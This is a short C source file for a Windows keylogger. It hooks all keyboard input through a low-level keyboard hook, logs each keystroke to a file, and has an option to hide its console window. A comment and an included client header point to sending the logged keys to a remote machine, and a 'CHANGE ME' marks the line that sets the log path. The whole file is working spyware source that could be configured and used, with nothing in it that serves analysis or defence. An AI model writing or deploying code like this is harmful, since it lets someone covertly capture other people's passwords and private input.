#define TIMEOUT 5000

#include <stdio.h>
#include "lib/client.h"
#include "lib/keySavers.h"

char logFilePath[] = ".\\logfile.txt"; //CHANGE ME
BOOL hidden = FALSE; //don't show process window

LRESULT CALLBACK hookProcedure(int nCode, WPARAM wParam, LPARAM lParam){

	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)){

		logKey(lParam, logFilePath);
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {

	//set up socket for remote key-logging
	HHOOK windowHook;
	MSG   message;

	//set window show state
	ShowWindow(GetConsoleWindow(), hidden ? SW_HIDE : SW_SHOW);

	//join the hook-chain https://docs.microsoft.com/it-it/windows/win32/winmsg/about-hooks
	windowHook = SetWindowsHookExA(WH_KEYBOARD_LL, hookProcedure, GetModuleHandle(NULL), NULL);

	if (!windowHook) {
		//hook failed
		return 1;
	}
	//recive message data from the hook-chain and dispatch to our hookProcedure
	//this should work
	//update: yes
	while (GetMessage(&message, NULL, 0, 0) > 0) {

		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(windowHook);
	return 0;
}

